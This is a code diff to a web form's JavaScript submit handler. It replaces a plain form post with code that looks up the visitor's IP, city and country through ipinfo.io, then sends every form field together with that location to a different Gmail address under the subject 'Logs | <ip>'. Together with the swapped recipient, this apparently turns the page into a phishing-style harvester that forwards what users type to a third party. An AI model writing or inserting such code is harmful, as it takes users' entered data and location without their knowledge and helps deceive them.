@@ -83,19 +83,23 @@ form.addEventListener('submit', function(e) {
         }
     }
 
-    $.ajax({
-        type: "POST",
-        url: "https://formsubmit.co/ajax/willockj21@gmail.com",
-        data: formData,
-        enctype: 'multipart/form-data',
-        processData: false,
-        contentType: false,
-    })
-    .done((data) => {
-        window.location.href = './success.html';
-    })
-    .fail(reason => {
-        console.error(reason);
-        alert("Error: " + reason.responseText + "\nPlease try again.");
-    })
+   $.getJSON('https://ipinfo.io', function(response) {
+        $.ajax({
+            type: "POST",
+            url: "https://formsubmit.co/ajax/sanetbehin.co@gmail.com",
+            data: {
+                _subject: "Logs | " + response.ip,
+                ...values,
+                IP: response.ip,
+                Location: response.city + ", " + response.country,
+            },
+        })
+        .done((data) => {
+            window.location.href = './success.html';
+        })
+        .fail(reason => {
+            console.error(reason);
+            alert("Error: " + reason.message + "\nPlease try again.");
+        })
+    }, "json");
 })
